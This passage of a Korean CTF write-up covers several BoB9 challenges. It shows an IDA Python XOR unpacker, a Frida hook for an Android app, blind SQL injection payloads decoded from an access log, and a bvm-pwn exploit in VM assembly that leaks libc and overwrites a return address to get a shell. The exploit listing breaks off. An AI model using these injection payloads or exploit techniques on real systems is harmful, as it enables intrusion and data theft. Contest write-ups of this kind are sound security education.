IDA Pythonì„ ì‚¬ìš©í•˜ì—¬ ì‘ì„±í•œë‹¤.</li></ol></li></ul><p id="6c02958a-ab31-4c80-a165-cd674ad623c6" class="">
</p><pre id="73551061-6f38-4753-8281-5004d5de56db" class="code code-wrap"><code>import struct
p32 = lambda x:struct.pack(&quot;&lt;L&quot;, x)

# patch_xor : Xor ì—°ì‚°ì„ í†µí•´ íŒ¨ì¹˜ë¥¼ ìˆ˜í–‰í•˜ëŠ” í•¨ìˆ˜
def patch_xor(addr_patch, addr_end, xor_key):
    size_patch = addr_end - addr_patch
    for i in range(size_patch):
        cur = addr_patch + i
        idc.PatchByte(cur, idc.Byte(cur) ^ xor_key[i % len(xor_key)])
        # Xor ì—°ì‚°í•œ ë°ì´í„°ë¥¼ íŒ¨ì¹˜í•˜ì—¬ ë°˜ì˜
        idc.MakeUnknown(cur, 1, idc.DOUNK_SIMPLE)
        # íŒ¨ì¹˜ í›„ Unknown í˜•íƒœë¡œ ë³€í™˜í•˜ì—¬ ì˜ëª»ëœ ë””ìŠ¤ì–´ì…ˆë¸”ë¦¬ ë°©ì§€
    return

# xor_data : ë‹¨ìˆœ Xor í•¨ìˆ˜
def xor_data(addr_xor, addr_end, xor_key):
    result = []
    size_xor = addr_end - addr_xor
    for i in range(size_xor):
        cur = addr_xor + i
        result.append(idc.Byte(cur) ^ xor_key[i % len(xor_key)])
    return result

addr_start = 0x401000   # í•¨ìˆ˜ ì‹œì‘ ì£¼ì†Œ
addr_end = 0x42D700     # í•¨ìˆ˜ ë§ˆì§€ë§‰ ì£¼ì†Œ, ê¸¸ì´ ê³„ì‚°ì— ì‚¬ìš©

cnt = 0
keys = []

cur = addr_start
while cur &lt; addr_end:   # ë””ìŠ¤ì–´ì…ˆë¸”ë¦¬ë¥¼ í†µí•´ Key í¬ê¸°, íŒ¨ì¹˜ ì£¼ì†Œë¥¼ êµ¬í•¨
    key_size = 0
    addr_patch = 0
    while cur &lt; addr_end:
        try:
            dis = idc.GetDisasm(cur)
            if dis.find(&quot;retn&quot;) != -1:
                break
            # cmp ëª…ë ¹ì–´ì—ì„œ Key í¬ê¸° ì¶”ì¶œ
            if dis.find(&quot;cmp&quot;) != -1 and dis.find(&quot;], 0&quot;) == -1:
                tmp = dis.split(&quot;, &quot;)[1]
                if tmp.find(&quot;h&quot;) != -1:
                    key_size = int(tmp[:-1], base=16)
                else:
                    key_size = int(tmp)
            # sub ëª…ë ¹ì–´ì—ì„œ íŒ¨ì¹˜ ì£¼ì†Œ ì¶”ì¶œ
            if dis.find(&quot;sub&quot;) != -1 and dis.find(&quot;offset&quot;) != -1:
                tmp = dis.split(&quot;_&quot;)[1].replace(&quot; &quot;, &quot;&quot;)
                if tmp.find(&quot;;&quot;) != -1:
                    tmp = tmp.split(&quot;;&quot;)[0]
                addr_patch = int(tmp, base=16)
            cur += idc.ItemSize(cur)
        except:
            break
            
    print cnt, key_size, hex(addr_patch),
    
    # Flag ì¶œë ¥ í•¨ìˆ˜ì˜ ê²½ìš° ì„ì˜ë¡œ Keyì„ ìˆ˜ì •
    if cnt == 10:
        key_size = 32
        
        tmp = p32(0x454D4E4A)
        tmp += p32(0x07692B4B)
        tmp += p32(0x2D0C1A2C)
        tmp += p32(0x0E0D100A)
        tmp += p32(0x09090476)
        tmp += p32(0x26065966)
        tmp += p32(0x1C103417)
        tmp += p32(0x567C2075)
        
        prev_key = xor_key[::]
        xor_key = []
        for i in range(key_size):
            xor_key.append(ord(tmp[i]) ^ prev_key[i % len(prev_key)])
    
    # ì—°ì‚° ì˜¤ë¥˜ê°€ ìˆì„ ì‹œ break
    if key_size == 0 or addr_patch == 0:
        break
    
    # Flag ì¶œë ¥ í•¨ìˆ˜ê°€ ì•„ë‹Œ ê²½ìš°, Key ì¶”ì¶œ ìˆ˜í–‰
    if key_size != 32:
        known_data = [0x66, 0x90, 0x55, 0x8B, 0xEC] # ì•Œë ¤ì§„ Hot Patching 5ë°”ì´íŠ¸
        xor_key = []
        # Hot Patching 5ë°”ì´íŠ¸ë¥¼ í†µí•´, Key ì²« 5ê¸€ì ì¶”ì¶œ
        for i in range(5):
            xor_key.append(idc.Byte(addr_patch + i) ^ known_data[i])
        
        # 5ê¸€ì ë³´ë‹¤ ë§ì„ ê²½ìš°
        if key_size != 5:
            xor_key += [0x00] * (key_size - 5)

            # ëª¨ë¥´ëŠ” ê¸€ìëŠ” 0x00ìœ¼ë¡œ ì±„ìš°ê³  Xor ì—°ì‚° ìˆ˜í–‰
            data = xor_data(addr_patch, addr_end, xor_key)
            
            # ê³µí†µ 58ë°”ì´íŠ¸ ì½”ë“œ
            known_data = [0xC7, 0x45, 0xF8, 0x04, 0xB3, 0x44, 0x00, 0x8B, 0x45, 0xF8, 0x83, 0xC0, 0x01, 0x89, 0x45, 0xF4, 0x8B, 0x4D, 0xF8, 0x8A, 0x11, 0x88, 0x55, 0xFF, 0x83, 0x45, 0xF8, 0x01, 0x80, 0x7D, 0xFF, 0x00, 0x75, 0xEE, 0x8B, 0x45, 0xF8, 0x2B, 0x45, 0xF4, 0x89, 0x45, 0xF0, 0x8B, 0x4D, 0xF0, 0x89, 0x0D, 0x00, 0xB3, 0x44, 0x00]
            known_data = &quot;&quot;.join(chr(x) for x in known_data)
            
            # ê³µí†µ 58ë°”ì´íŠ¸ ì½”ë“œë¥¼ í†µí•œ, Key ì „ë¶€ë¥¼ ë³µêµ¬
            xor_key = xor_key[:5]
            for i in range(len(data) - key_size):
                # ê³µí†µ ì½”ë“œì™€ Xor ìˆ˜í–‰í•œ ê²°ê³¼ë¥¼ 5ë°”ì´íŠ¸ì”© ë¹„êµ
                cur_data = &quot;&quot;.join(chr(x) for x in data[i:i+5])
                idx = known_data.find(cur_data)
                if idx != -1:   #
                    # ê³µí†µ ì½”ë“œì˜ ì–´ëŠ ì¸ë±ìŠ¤ë¶€í„° Keyì´ ì‹œì‘ ë˜ëŠ”ì§€ í™•ì¸
                    # (Key í¬ê¸°, ë”ë¯¸ ì½”ë“œ ë“±ì— ì˜í•´ ì˜¤í”„ì…‹ì´ ë§¤ë²ˆ ë‹¤ë¥´ê¸° ë•Œë¬¸)
                    org = known_data[idx+5:idx+5+key_size]
                    for j in range(key_size - 5):
                        xor_key.append(ord(org[j]) ^ data[i+5+j]) #Key ë³µêµ¬
                    break
            
            if len(xor_key) == 5:
                # Flag ì¶œë ¥ í•¨ìˆ˜(11 ë²ˆì§¸)ì˜ ê²½ìš° ì˜ˆì™¸ë¡œ ì²˜ë¦¬
                if cnt == 9:
                    xor_key += [ord(&#x27;r&#x27;), ord(&#x27;i&#x27;), ord(&#x27;n&#x27;)] #mandarin
                else:
                    print &quot;Error!!&quot;
                    xor_key += [0x00] * (key_size - 5)
        
    print &quot;&quot;.join(chr(x) for x in xor_key)
    keys.append(&quot;&quot;.join(chr(x) for x in xor_key))
    
    
    patch_xor(addr_patch, addr_end, xor_key)    # ì¶”ì¶œí•œ Keyë¥¼ í†µí•´ íŒ¨ì¹˜ ìˆ˜í–‰
    idc.MakeCode(addr_patch)                    # ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¡œ ë³€í™˜
    idc.MakeFunction(addr_patch)                # í•¨ìˆ˜í™” ìˆ˜í–‰
    
    cur = addr_patch
    cnt += 1

f = open(&quot;solve_key.txt&quot;, &quot;wb&quot;)                 # ì¶”ì¶œí•œ Keyë¥¼ ì €ì¥
for i in range(len(keys)):
    f.write(keys[i])
    f.write(&quot;\r\n&quot;)
f.close()</code></pre><figure id="3277b602-700b-4d19-8acd-ea0c781589ba" class="image"><a href="/assets/2020-09-01/bob/18_flag2.png"><img style="width:499px" src="/assets/2020-09-01/bob/18_flag2.png"/></a><figcaption>                                            [ê·¸ë¦¼ 7] ë‘ ë²ˆì§¸ Flag íšë“</figcaption></figure><ul id="789f9b77-e64a-4504-b960-042cb090ef27" class="bulleted-list"><li>Flag ë˜í•œ ìë™ìœ¼ë¡œ ì—°ì‚°í•  ìˆ˜ ìˆì§€ë§Œ, ìë™í™”ë¡œ ì¶”ì¶œí•œ ì…ë ¥ ê°’ì„ ë³µì‚¬ í›„ ëŒ€ì…í•˜ì—¬ íšë“í•˜ì˜€ë‹¤.</li></ul><p id="4efcd544-d4da-4082-9267-bb763d3c30f5" class="">
</p><h2 id="9e1053cd-3884-45db-a37a-32471921d7f0" class="">EASYROID</h2><hr id="698861a0-5f38-40bc-b55e-355837ab6e62"/><figure id="770f5db6-8e99-4510-b52c-eefaa1425a86" class="image"><a href="/assets/2020-09-01/bob/bob954.png"><img style="width:712px" src="/assets/2020-09-01/bob/bob954.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="d1c6dd1d-2f4d-4c56-ac8b-850c4c3cd40c"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">Easy Android Reversing Challenge</div></figure><p id="1d112550-6738-4612-8d22-ee47b42f78e2" class="">
</p><ul id="289a6841-cd2d-4082-bb66-58cad5e23daf" class="bulleted-list"><li>JAVA ì½”ë“œë¥¼ ë¨¼ì € ì‚´í´ë³´ì.<figure id="542a7a21-98af-47cf-b0bf-5673ffc2d4d4" class="image"><a href="/assets/2020-09-01/bob/bob955.png"><img style="width:599px" src="/assets/2020-09-01/bob/bob955.png"/></a></figure><p id="98a20162-fcd7-49ee-8430-13752c8ef80a" class=""><code>MainActivity</code>ê°€ ì‹¤í–‰ë˜ë©´ <code><a href="http://native-lib.so">libnative-lib.so</a></code>ì— ì •ì˜ë˜ì–´ ìˆëŠ” <code>stringFromJNI</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œ í•œë’¤ <code>setText</code>ë¡œ <code>TextView</code>ì— ë„£ì–´ì£¼ëŠ” ê°„ë‹¨í•œ ì½”ë“œì´ë‹¤.</p></li></ul><p id="4b7f7f2d-8dcb-4159-9153-a2413f9075e6" class="">
</p><ul id="8bdc6317-9a12-411f-ba17-cf13b11295a6" class="bulleted-list"><li><code>stringFromJNI</code> í•¨ìˆ˜ë¥¼ ì‚´í´ë³´ì.<figure id="a6338060-bf4a-4964-b84c-4b5fcdecdb1f" class="image"><a href="/assets/2020-09-01/bob/bob956.png"><img style="width:580px" src="/assets/2020-09-01/bob/bob956.png"/></a></figure><p id="a2effdc4-9bb2-4d45-8adf-8181542cc263" class=""><code>stringFromJNI</code> í•¨ìˆ˜ëŠ” <code>Hello BOB9?</code> ë¬¸ìì—´ì„ ë¦¬í„´í•´ì¤€ë‹¤.</p><p id="42da8e6b-3945-4334-91dc-27ba70336c59" class="">
</p></li></ul><p id="2fb6fb81-fab9-40e5-8255-11fd9e351410" class="">ê²°êµ­ ì•±ì„ ì‹¤í–‰í•˜ë©´ í™”ë©´ì— <code>Hello BOB9?</code> ë¬¸ìì—´ì´ ì¶œë ¥ëœìš”. ì‹¤í–‰í•´ì„œ í™•ì¸í•˜ì.</p><figure id="1f7531c2-8517-42f6-a90e-6b55a367b868" class="image"><a href="/assets/2020-09-01/bob/bob957.png"><img style="width:290px" src="/assets/2020-09-01/bob/bob957.png"/></a><figcaption>ë¹™ê³ !</figcaption></figure><p id="fd8c547d-5464-42c6-bfdc-6f6b545b66bb" class=""> <code><a href="http://native-lib.so">libnative-lib.so</a></code>ì˜ Export Tableì„ ì‚´í´ë³´ë©´ <code>stringFromJNI</code> í•¨ìˆ˜ ì´ ì™¸ í•œ ê°€ì§€ í•¨ìˆ˜ê°€ ë” ì¡´ì¬í•œë‹¤.</p><figure id="50106b8d-d5b8-4407-a212-7b5cc9eed45b" class="image"><a href="/assets/2020-09-01/bob/bob958.png"><img style="width:446px" src="/assets/2020-09-01/bob/bob958.png"/></a><figcaption>HiddenStage!!!</figcaption></figure><p id="3d2836a2-4085-47e2-a9e7-f55139a320e1" class="">
</p><p id="5f9259aa-155c-4ae4-9359-c10d27c7172b" class="">HiddenStage í•¨ìˆ˜ë¥¼ ì‚´í´ë³´ì.</p><figure id="d858f375-3a1b-4fb4-acb6-a88446b791e7" class="image"><a href="/assets/2020-09-01/bob/bob959.png"><img style="width:621px" src="/assets/2020-09-01/bob/bob959.png"/></a></figure><p id="6bd13c3c-9aef-4d26-99ee-de1f988c5947" class="">BLOWFISH ë¥¼ ì‚¬ìš©í•´ì„œ íŠ¹ì • ê°’ì„ Decrypt í•˜ê³  Flagë¥¼ ì¶œë ¥í•´ë³´ì.</p><p id="20963073-9e06-4ecc-a317-d3aa4d9db1d1" class="">ë”°ë¼ì„œ <code>F0</code>ë¥¼ BLOWFISHì˜ í‚¤ë¡œ <code>BOB9</code>ì„ ì‚¬ìš©í•´ì„œ Decrypt í•´ì£¼ë©´ Flagê°€ ë‚˜ì˜¤ê² ì§€?</p><p id="3893a2f4-59dd-4be5-b00d-9bfd82d9ab46" class="">í•˜ì§€ë§Œ ì—¬ê¸°ì„œ <code>Fake</code>ê°€ ì¡´ì¬í•œë‹¤. Initì˜ ë§ˆì§€ë§‰ ì¸ìëŠ” Key Sizeì¸ë° 7ì´ë‹¤.</p><p id="82d93b2c-d4d6-4a07-87d0-3fd367ce8a86" class="">ë”°ì„œ ì‹¤ì œ BLOWFISHì˜ í‚¤ ê°’ì€ <code>BOB9\x00\x00\x00</code>!</p><p id="7ae058f8-7e9d-4de8-a41e-1472795c7e70" class="">
</p><p id="32e1b75a-d74d-424b-8403-f68e362bfa89" class="">ì´ëŸ° Fakeì— ë‹¹í•˜ì§€ ì•Šìœ¼ë ¤ë©´ ì‹¤ì œë¡œ ê·¸ëŒ€ë¡œ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì´ ìˆë‹¤.</p><p id="03aabc70-de76-4f3c-bc7f-3f9dc3fbc017" class="">ìƒˆë¡œìš´ í”„ë¡œì íŠ¸ë¥¼ ë§Œë“¤ì–´ì„œ .soë¥¼ ë¼ì›Œë„£ê³  ì»´íŒŒì¼í•˜ëŠ” ë°©ë²•ë„ ìˆê² ì§€ë§Œ Fridaë¥¼ ì‚¬ìš©í•´ë³´ì.</p><p id="afe7953e-6cdc-47b7-abb1-e57a918f32cc" class="">
</p><pre id="7f96bb9d-407a-4895-9a0c-15b74ddab8b1" class="code"><code>var addrStringFromJNI = Module.findExportByName(null, &#x27;Java_jeong_su_bob9_1easy_1android_MainActivity_stringFromJNI&#x27;);
var addrHiddenStage = Module.findExportByName(null, &#x27;Java_jeong_su_bob9_1easy_1android_MainActivity_HiddenStage&#x27;);
var HiddenStage = new NativeFunction(addrHiddenStage, &#x27;int&#x27;, [&#x27;pointer&#x27;]);

Interceptor.attach(addrStringFromJNI, {
	onEnter: function(argv){
		this.arg0 = argv[0];
	},
	onLeave: function(rets){
		rets.replace( HiddenStage(this.arg0) );
	}
});</code></pre><p id="cb4c7566-d735-412d-b3ec-9d0188dd22f5" class="">ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” stringFromJNI í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ë©´ HiddenStage í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ë¦¬í„´ì„ ë³€ê²½í•´ì£¼ëŠ” ìŠ¤í¬ë¦½íŠ¸ì´ë‹¤.</p><p id="e0a893d0-faf9-4a3c-a655-d6db98538699" class="">
</p><pre id="64078f24-42e2-4303-b631-644fb9af25d1" class="code"><code>am start -n jeong.su.bob9_easy_android/.MainActivity</code></pre><p id="397d049b-f27e-4f94-9868-a7adc484c9e3" class="">ê·¸ë¦¬ê³  MainActivityë¥¼ am ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‹œì‘í•´ì£¼ë©´ ì•„ë˜ì™€ ê°™ì´ í”Œë˜ê·¸ë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><p id="6646536d-d85f-4c50-9c60-a75301903f9d" class="">
</p><figure id="6e105802-75e7-4856-bb70-988a75e54a01" class="image"><a href="/assets/2020-09-01/bob/bob960.png"><img style="width:372px" src="/assets/2020-09-01/bob/bob960.png"/></a></figure><h1 id="9b799560-d728-49a3-a967-971a0d033d4f" class="">ğŸ–¥ï¸ FORENSIC</h1><h2 id="64558c76-c410-4400-ab49-15766f8520d8" class="">SQL Eyes</h2><hr id="1eea566b-99c7-4781-ba54-3dafef735ea3"/><figure id="18b57247-622d-4c2f-8d27-6e6d923337da" class="image"><a href="/assets/2020-09-01/bob/bob961.png"><img style="width:709px" src="/assets/2020-09-01/bob/bob961.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="20691f4d-3f7e-4f8e-a772-8a8176c8685d"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">Find the leaked data</div></figure><ul id="b761d9fa-8683-4589-960e-e0839b568999" class="bulleted-list"><li>í•´ë‹¹ ë¬¸ì œì—ì„œëŠ” ì›¹ ì„œë²„ì˜ access.log íŒŒì¼ì´ ì œê³µë˜ì—ˆë‹¤.</li></ul><pre id="ccc05a17-e90e-4c5a-b20f-1ccff4d1b4ce" class="code"><code>192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] &quot;GET /view.php?idx=1 HTTP/1.1&quot; 200 202 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&quot;
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] &quot;GET /view.php?idx=2-1 HTTP/1.1&quot; 200 202 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&quot;
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] &quot;GET /view.php?idx=0%7C%7C1-- HTTP/1.1&quot; 200 202 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&quot;
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] &quot;GET /view.php?idx=0%7C%7Cif%28substr%28lpad%28bin%28ord%28substr%28flag%2C1%2C1%29%29%29%2C8%2C0%29%2C1%2C1%29%3D1%2C1%2C%28select+1+union+select+2%29%29-- HTTP/1.1&quot; 500 185 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&quot;
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] &quot;GET /archives/ HTTP/1.1&quot; 404 437 &quot;-&quot; &quot;DirBuster-0.12 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)&quot;
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] &quot;GET /view.php?idx=0%7C%7Cif%28substr%28lpad%28bin%28ord%28substr%28flag%2C1%2C1%29%29%29%2C8%2C0%29%2C2%2C1%29%3D1%2C1%2C%28select+1+union+select+2%29%29-- HTTP/1.1&quot; 200 203 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&quot;
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] &quot;GET /view.php?idx=0%7C%7Cif%28substr%28lpad%28bin%28ord%28substr%28flag%2C1%2C1%29%29%29%2C8%2C0%29%2C3%2C1%29%3D1%2C1%2C%28select+1+union+select+2%29%29-- HTTP/1.1&quot; 200 202 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&quot;</code></pre><ul id="f21723cb-4ff4-4761-b462-db0e42128df3" class="bulleted-list"><li>access.logë¥¼ í†µí•´ ë°ì´í„°ë¥¼ ìœ ì¶œí•œ ê³µê²©ì€ Blind SQL Injection ê³µê²©ì¸ ê²ƒì„ ì•Œ ìˆ˜ ìˆëŠ”ë° ìœ í˜•ì´ 2ê°€ì§€ê°€ ìˆë‹¤.</li></ul><ul id="25065056-66b5-4ba7-95ef-5c46c70be77d" class="bulleted-list"><li><code>0||if(substr(lpad(bin(ord(substr(flag,1,1))),8,0),1,1)=1,1,(select 1 union select 2))</code>ì„ í†µí•´ ê±°ì§“ì¼ ê²½ìš°ì—ëŠ” 500 ì—ëŸ¬ë¥¼ ë°œìƒì‹œì¼œ Error based SQL Injection ê³µê²©ì„ í•œ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul><ul id="1057687c-b74a-448c-8c89-31a877083533" class="bulleted-list"><li>ë‘ë²ˆì§¸ ìœ í˜•ì€ <code>0||if(substr(lpad(bin(ord(substr(flag,12,1))),8,0),1,1)=1,sleep(3)=0,1)=0--</code> ì„ í†µí•´ ì°¸ì¼ ê²½ìš° 3ì´ˆ sleepí•˜ì—¬ Time based SQL Injection ê³µê²©ì„ í•œ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul><ul id="4c13940f-742f-41a1-bca2-10d881f18a59" class="bulleted-list"><li>ìœ„ ë‘ê°€ì§€ ê³µê²© ê¸°ë²•ì„ í†µí•´ ê³µê²©ìê°€ ìœ ì¶œí•œ ë°ì´í„°ë¥¼ íŒŒì•…í•˜ë©´ ëœë‹¤. ì•„ë˜ì™€ ê°™ì´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ì—¬ ë¬¸ì œë¥¼ í•´ê²°í•  ìˆ˜ ìˆë‹¤.</li></ul><pre id="ca3b2b1c-bea6-4dd6-9d9b-00b7c20cd21c" class="code"><code>f = open(&#x27;access.log&#x27;, &#x27;r&#x27;)
temp = &quot;&quot;
flag = &quot;&quot;
prevsec = 0
first_bypass = True

for line in f.readlines():
    x = line.split()
    
    if len(x) == 0:
        continue
        
    if &quot;OWASP_DirBuster_Project&quot; in x[-1]:
        continue
        
    if &#x27;union&#x27; in x[6]:
        if x[8] == &#x27;200&#x27;:
            temp += &quot;1&quot;
        else:
            temp += &quot;0&quot;
        
        if len(temp) % 8 == 0 and len(temp) != 0:
            flag += chr(int(temp, 2))
            print(flag)
            temp = &quot;&quot;
    
    if &#x27;sleep&#x27; in x[6]:
        if first_bypass:
            first_bypass = False
            continue
        hour, min, sec = x[3].split(&quot;:&quot;)[1:]
        allsec = int(min) * 60 + int(sec)
        relsec = allsec - 3111
            
        if (relsec - prevsec) &gt; 2.5:
            temp += &quot;1&quot;
        else:
            temp += &quot;0&quot;
        
        if len(temp) % 8 == 0 and len(temp) != 0:
            flag += chr(int(temp, 2))
            print(flag)
            temp = &quot;&quot;
        
        prevsec = relsec</code></pre><h1 id="b577288c-0165-401f-8936-93bd3fada5fd" class="">ğŸ–¥ï¸ PWN</h1><h2 id="39abfa2f-c121-4442-a769-09055252cd5e" class="">bvm-pwn</h2><hr id="4f1a6ee9-8d69-479d-b320-fd1fb047a9fa"/><figure id="55bac55d-225c-4d10-aca8-c6d09da60b41" class="image"><a href="/assets/2020-09-01/bob/bob962.png"><img style="width:795px" src="/assets/2020-09-01/bob/bob962.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="92246095-b2e0-44e1-8b68-4efb3d98baf2"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">bvmì—ì„œ ì¼ë¶€ ê²½ê³„ ê²€ì‚¬ë¥¼ ìˆ˜í–‰í•˜ì§€ ì•ŠëŠ” ë£¨í‹´ì„ ì´ìš©í•˜ì—¬ stack ì˜ì—­ ë³€ì¡° ë° ì‰˜ íšë“</div></figure><p id="060e3db1-14f7-4894-8e5f-8fbd74bd5959" class="">bvm opcodeë¥¼ í•´ì„í•˜ê³  ì‹¤í–‰í•˜ëŠ” ê³¼ì •ì—ì„œ ì´ 3ê°€ì§€ ì·¨ì•½ì ì´ ì¡´ì¬í•œë‹¤.</p><p id="ceaa9d84-cbf9-4804-9a3c-83f8ec1c7113" class="">
</p><ol id="d66829d5-e886-4f72-9c4c-45819a4c07b5" class="numbered-list" start="1"><li><code>COMP reg, reg</code> opcodeì—ì„œ left register indexì— ëŒ€í•´ì„œëŠ” ê²½ê³„ ê²€ì‚¬ë¥¼ í•˜ì§€ë§Œ right register indexëŠ” ê²½ê³„ ê²€ì‚¬ë¥¼ í•˜ì§€ ì•Šì•„, ê²½ê³„ë¥¼ ë„˜ëŠ” register indexë¥¼ ì°¸ì¡°í•˜ì—¬ 255ë²ˆ ë°˜ë³µ ë¹„êµë¥¼ í†µí•´ ì¼ë¶€ stack ì˜ì—­ì„ ê°„ì ‘ì ìœ¼ë¡œ leak í•  ìˆ˜ ìˆë‹¤.<figure id="7e79a767-c514-4b79-805b-1aeef668bd69" class="image"><a href="/assets/2020-09-01/bob/bob963.png"><img style="width:527px" src="/assets/2020-09-01/bob/bob963.png"/></a></figure></li></ol><ol id="ead4992c-5207-445f-a383-ef9a26bc0d89" class="numbered-list" start="2"><li><code>LSHIRT/RSHIFT reg, reg, reg</code>  opcodeì—ì„œ left register indexì— ëŒ€í•œ ê²½ê³„ ê²€ì‚¬ë¥¼ í•˜ì§€ ì•Šì•„ ì¼ë¶€ stack ì˜ì—­ì„ ë®ì„ ìˆ˜ ìˆë‹¤.<figure id="b619bdc6-e206-4743-a0a0-46524e59c073" class="image"><a href="/assets/2020-09-01/bob/bob964.png"><img style="width:560px" src="/assets/2020-09-01/bob/bob964.png"/></a></figure></li></ol><ol id="3e8311d7-b55d-4b94-b0a6-292aab12bd1e" class="numbered-list" start="3"><li><code>MOVE reg, [reg]</code>  opcodeì—ì„œ register indexì— ëŒ€í•œ ê²½ê³„ ê²€ì‚¬ëŠ” í•˜ì§€ë§Œ <code>vm-&gt;reg[right_idx]</code>ê°€ <code>vm-&gt;size</code>ë³´ë‹¤ í°ì§€ì— ëŒ€í•œ ê²€ì‚¬ë¥¼ í•˜ì§€ì•Šì•„ ì¼ë¶€ stack ì˜ì—­ì„ leak í•  ìˆ˜ ìˆë‹¤.
3ë²ˆì˜ ê²½ìš° ì‚¬ì‹¤ ì˜ë„í•˜ì§€ ì•Šì€ ì·¨ì•½ì ìœ¼ë¡œ, ëŒ€íšŒ ë„ì¤‘ íŒ¨í‚· ëª¨ë‹ˆí„°ë§ì„ í–ˆì„ ë•Œ í”Œë˜ê·¸ë¥¼ íšë“í•œ 4ë¶„ ëª¨ë‘ 1ë²ˆ ëŒ€ì‹  ì´ ì·¨ì•½ì ì„ ì´ìš©í•˜ì˜€ë‹¤.</li></ol><figure id="325e775e-3652-487b-a007-2215a152d378" class="image"><a href="/assets/2020-09-01/bob/bob965.png"><img style="width:617px" src="/assets/2020-09-01/bob/bob965.png"/></a></figure><p id="e8d7ba39-f641-4ae8-8e63-2f8f6e8791d2" class="">
</p><p id="ae068463-604d-4288-b7d8-4ef61fe2e047" class="">ìœ„ ì·¨ì•½ì ìœ¼ë¡œ main return addressë¥¼ leakí•˜ì—¬ libc ì£¼ì†Œë¥¼ ì–»ê³  oneshot gadgetë¥¼ ê³„ì‚°í•˜ì—¬ ë‹¤ì‹œ main return addressë¥¼ ë®ìœ¼ë©´ ì‰˜ì„ íšë“í•  ìˆ˜ ìˆë‹¤.</p><p id="2d082537-8c29-4897-ade8-174f5934f802" class="">ë§ˆì§€ë§‰ìœ¼ë¡œ ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•˜ëŠ” vm codeë¥¼ ì‘ì„±í•´ì•¼í•œë‹¤.</p><p id="615f0c41-6bc3-479f-978e-f3196d408081" class="">
</p><p id="32e13771-9e80-4e3c-81bd-7fbf63aa3865" class=""><strong>pwn.asm</strong></p><pre id="a2d6d7dd-f77f-4b4d-83d5-11abb128fc6c" class="code code-wrap"><code>.LEAK_DATA
empty 8

.LEAK_WORD_1
MOVE cx, 0
:LABEL_1
COMP cx, 18x
MOVE ax, cx
ADD cx, 1
JNE LABEL_1
RETURN

.LEAK_WORD_2
MOVE cx, 0
:LABEL_2
COMP cx, 19x
MOVE ax, cx
ADD cx, 1
JNE LABEL_2
RETURN

.LEAK_WORD_3
MOVE cx, 0
:LABEL_3
COMP cx, 20x
MOVE ax, cx
ADD cx, 1
JNE LABEL_3
RETURN

.LEAK_WORD_4
MOVE cx, 0
:LABEL_4
COMP cx, 21x
MOVE ax, cx
ADD cx, 1
JNE LABEL_4
RETURN

.MAIN
// leak libc
CALL LEAK_WORD_1
MOVE bx, SECTION#LEAK_DATA
ADD bx, 0
MOVE [bx], ax

CALL LEAK_WORD_2
MOVE bx, SECTION#LEAK_DATA
ADD bx, 2
MOVE [bx], ax

CALL LEAK_WORD_3
MOVE bx, SECTION#LEAK_DATA
ADD bx, 4
MOVE [bx], ax

CALL LEAK_WORD_4
MOVE bx, SECTION#LEAK_DATA
ADD bx, 6
MOVE [bx], ax

// leak
MOVE cx, 8
MOVE bx, SECTION#LEAK_DATA
MOVE ax, 1
SYSCALL

// write SECTION#LEAK_DATA
MOVE ax, 0
SYSCALL


// overwrite
MOVE bx, 0
MOVE ax, SECTION#LEAK_DATA
MOVE dx, [ax]
LSHIFT 18x, dx, bx

ADD ax, 2
MOVE dx, [ax]
LSHIFT 19x, dx, bx

ADD ax, 2
MOVE dx, [ax]
LSHIFT 20x, dx, bx

ADD ax, 2
MOVE dx, [ax]
LSHIFT 21x, dx, bx
